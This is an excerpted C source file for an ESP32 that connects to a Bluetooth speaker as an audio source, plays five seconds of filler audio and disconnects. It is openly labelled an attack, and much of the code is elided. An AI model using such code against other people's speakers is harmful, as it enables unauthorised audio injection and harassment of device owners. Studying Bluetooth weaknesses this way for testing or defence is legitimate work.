// speaker_exploit.c - ESP32 attack: play short audio after connecting to speaker
...
static const uint8_t sample_audio_data[AUDIO_CHUNK_SIZE] = { [0 ... AUDIO_CHUNK_SIZE-1] = 0x55 };
    ...
    switch (event) {
        case ESP_A2D_CONNECTION_STATE_EVT: {
            if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
                ESP_LOGI(TAG, "Connected to speaker. Starting 5s audio...");
                vTaskDelay(pdMS_TO_TICKS(5000));
                esp_a2d_source_disconnect(param->conn_stat.remote_bda);
                ESP_LOGI(TAG, "Finished streaming. Disconnected.");
            } else {
...
void app_main(void) {
    ...
    ESP_ERROR_CHECK(esp_bt_dev_set_device_name("ESP32_AUDIO_ATTACKER"));

    ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
    ESP_ERROR_CHECK(esp_a2d_source_register_data_callback((esp_a2d_source_data_cb_t)audio_data_callback));
